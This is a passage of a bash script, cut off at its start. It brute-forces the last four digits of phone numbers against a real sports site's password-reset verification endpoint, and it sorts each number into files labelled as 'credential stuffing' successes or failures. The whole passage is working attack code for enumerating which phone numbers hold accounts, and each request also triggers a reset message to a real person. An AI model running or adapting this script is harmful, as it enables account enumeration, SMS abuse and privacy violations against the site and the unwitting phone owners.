	phone=`echo $p | awk -F'_' '{print $2}' | sed "s/\.txt//g"`
	 city=`echo $p | awk -F'_' '{print $1}'`
	for a in {0..9}{0..9}{0..9}{0..9} ; do
			echo "$phone$a 撞库中..."
			curl -s "http://www.90tiyu.com/library/utility/json.ashx?act=getpwdsendphoneverify&phone=$phone$a" | jq | grep 操作成功
			if [ $? = 0 ] ; then
				echo "`date "+%Y-%m-%d %H:%M:%S"` $phone$a" >> ben.$city.撞库成功.$phone
			else
				echo "`date "+%Y-%m-%d %H:%M:%S"` $phone$a" >> ben.$city.撞库失败.$phone
		       	fi
	done
done
